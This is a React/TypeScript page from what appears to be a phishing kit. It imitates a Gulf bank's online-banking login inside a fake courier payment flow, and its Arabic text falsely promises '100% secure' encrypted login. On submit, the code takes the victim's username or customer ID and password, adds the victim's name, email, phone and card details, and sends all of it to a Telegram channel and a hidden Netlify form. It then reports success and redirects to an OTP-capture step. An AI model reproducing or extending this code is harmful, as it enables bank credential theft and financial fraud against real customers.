import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { applyDynamicIdentity } from "@/lib/dynamicIdentity";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {
    cardName: '',
    cardLast4: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  useEffect(() => {
    if (selectedBankId && selectedBankId !== 'skipped') {
      applyDynamicIdentity(`bank_${selectedBankId}`);
    }
  }, [selectedBankId]);
  
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
      return 'username';
    }
    
    return 'customerId';
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
      }
    }
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }

    await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      bankId={selectedBankId}
    >
      <div 
        className="rounded-2xl p-6 sm:p-8 mb-6 shadow-2xl border-2 relative overflow-hidden"
        style={{
          background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
          borderColor: selectedBankBranding?.colors.accent || selectedBank?.color || branding.colors.primary,
          borderRadius: selectedBankBranding?.borderRadius.lg || '16px',
          boxShadow: selectedBankBranding?.shadows.xl || `0 20px 60px -15px ${selectedBank?.color || branding.colors.primary}70`
        }}
      >
        <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
        <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
        
        <div className="relative flex items-center justify-between mb-6">
          <div className="flex items-center gap-4">
            {selectedBank ? (
              <div 
                className="w-20 h-20 sm:w-24 sm:h-24 rounded-2xl bg-white p-4 flex items-center justify-center shadow-2xl"
                style={{ borderRadius: selectedBankBranding?.borderRadius.md || '12px' }}
              >
                <BankLogo 
                  bankId={selectedBank.id}
                  bankName={selectedBank.name}
                  bankNameAr={selectedBank.nameAr}
                  color={selectedBank.color}
                  size="lg"
                  className="w-full h-full"
                />
              </div>
            ) : (
              <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0">
                <Building2 className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
              </div>
            )}
            <div 
              className="flex-1 text-white"
              style={{ fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
            >
              <p className="text-sm sm:text-base opacity-90 mb-1 font-semibold">الخدمات المصرفية الإلكترونية</p>
              <p className="text-2xl sm:text-3xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
              <p className="text-sm sm:text-base opacity-80 mt-1" style={{ fontFamily: selectedBankBranding?.fonts.primary || 'Arial' }}>{selectedBank?.name || 'Online Banking'}</p>
            </div>
          </div>
          {selectedCountryData && (
            <span className="text-4xl sm:text-5xl">{selectedCountryData.flag}</span>
          )}
        </div>
        
        <div className="flex items-center gap-3 text-white/90 text-sm sm:text-base">
          <Lock className="w-5 h-5" />
          <span className="font-medium">تسجيل دخول آمن ومشفر</span>
          <span className="mr-auto opacity-70">•</span>
          <span className="opacity-70">256-bit SSL</span>
        </div>
      </div>

      <div 
        className="rounded-2xl p-5 sm:p-6 mb-6 border-2"
        style={{
          background: `linear-gradient(135deg, ${selectedBankBranding?.colors.primary || branding.colors.primary}10, ${selectedBankBranding?.colors.primary || branding.colors.primary}18)`,
          borderColor: `${selectedBankBranding?.colors.primary || branding.colors.primary}30`,
          borderRadius: selectedBankBranding?.borderRadius.md || '12px'
        }}
      >
        <div className="flex items-start gap-4">
          <div 
            className="w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0"
            style={{ background: `${selectedBankBranding?.colors.primary || branding.colors.primary}25` }}
          >
            <ShieldCheck className="w-6 h-6" style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }} />
          </div>
          <div className="flex-1">
            <div className="flex items-center gap-2 mb-2">
              <h3 
                className="font-bold text-base sm:text-lg" 
                style={{ 
                  color: selectedBankBranding?.colors.primary || branding.colors.primary,
                  fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                }}
              >
                تسجيل دخول آمن 100%
              </h3>
              <svg className="w-5 h-5 text-green-500" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <p className="text-sm sm:text-base text-muted-foreground leading-relaxed">
              سجّل دخولك إلى حسابك البنكي لتأكيد العملية. جميع بياناتك محمية بتشفير 256-bit SSL.
            </p>
            <div className="flex items-center gap-4 mt-3 text-xs sm:text-sm">
              <div className="flex items-center gap-1.5 text-green-600">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span className="font-medium">مشفر</span>
              </div>
              <div className="flex items-center gap-1.5 text-blue-600">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span className="font-medium">موثّق</span>
              </div>
              <div className="flex items-center gap-1.5 text-purple-600">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span className="font-medium">آمن</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-7">
        {loginType === 'username' && (
          <div>
            <Label className="mb-3 text-base sm:text-lg font-bold flex items-center gap-2">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              اسم المستخدم
            </Label>
            <div className="relative">
              <Input
                type="text"
                placeholder="أدخل اسم المستخدم"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="h-16 sm:h-18 text-lg sm:text-xl pr-5 pl-14 rounded-2xl border-2 focus:border-primary transition-all shadow-sm"
                style={{ borderColor: branding.colors.primary + '40' }}
                autoComplete="username"
                required
              />
              <div className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
            </div>
          </div>
        )}
        
        {loginType === 'customerId' && (
          <div>
            <Label className="mb-3 text-base sm:text-lg font-bold flex items-center gap-2">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
              </svg>
              رقم العميل
            </Label>
            <div className="relative">
              <Input
                type="text"
                placeholder="أدخل رقم العميل"
                value={customerId}
                onChange={(e) => setCustomerId(e.target.value)}
                className="h-16 sm:h-18 text-lg sm:text-xl pr-5 pl-14 rounded-2xl border-2 focus:border-primary transition-all shadow-sm"
                style={{ borderColor: branding.colors.primary + '40' }}
                inputMode="numeric"
                required
              />
              <div className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground">
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                </svg>
              </div>
            </div>
          </div>
        )}
        
        <div>
          <div className="flex items-center justify-between mb-3">
            <Label className="text-base sm:text-lg font-bold flex items-center gap-2">
              <Lock className="w-5 h-5" />
              كلمة المرور
            </Label>
            <button
              type="button"
              className="text-sm sm:text-base font-medium hover:underline"
              style={{ color: branding.colors.primary }}
            >
              نسيت كلمة المرور؟
            </button>
          </div>
          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="أدخل كلمة المرور"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-16 sm:h-18 text-lg sm:text-xl pr-5 pl-28 rounded-2xl border-2 focus:border-primary transition-all shadow-sm"
              style={{ borderColor: branding.colors.primary + '40' }}
              autoComplete="current-password"
              required
            />
            <div className="absolute left-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="text-muted-foreground hover:text-foreground transition-colors p-1"
              >
                {showPassword ? (
                  <EyeOff className="w-6 h-6" />
                ) : (
                  <Eye className="w-6 h-6" />
                )}
              </button>
              <div className="w-px h-7 bg-border" />
              <Lock className="w-6 h-6 text-muted-foreground" />
            </div>
          </div>
        </div>
        
        <div className="flex items-center justify-between text-sm sm:text-base">
          <div className="flex items-center gap-2">
            <input type="checkbox" id="remember" className="rounded w-4 h-4" />
            <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
              تذكرني
            </label>
          </div>
        </div>
        
        <Button
          type="submit"
          size="lg"
          className="w-full text-base sm:text-xl py-7 sm:py-8 text-white font-bold shadow-2xl"
          disabled={isSubmitting}
          style={{
            background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
            borderRadius: selectedBankBranding?.borderRadius.md || '12px',
            boxShadow: selectedBankBranding?.shadows.xl || `0 20px 60px -15px ${selectedBank?.color || branding.colors.primary}90`,
            fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
          }}
        >
          {isSubmitting ? (
            <span>جاري تسجيل الدخول...</span>
          ) : (
            <>
              <Lock className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
              <span>تسجيل الدخول والمتابعة</span>
            </>
          )}
        </Button>
        
        <p className="text-xs sm:text-sm text-center text-muted-foreground mt-4">
          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
        </p>
      </form>
      
      <div className="mt-8 pt-6 border-t text-center">
        <p className="text-sm text-muted-foreground mb-4">
          لا تملك حساب؟
        </p>
        <Button
          type="button"
          variant="outline"
          size="sm"
          className="text-sm"
          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
        >
          تسجيل حساب جديد
        </Button>
      </div>
    
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentBankLogin;
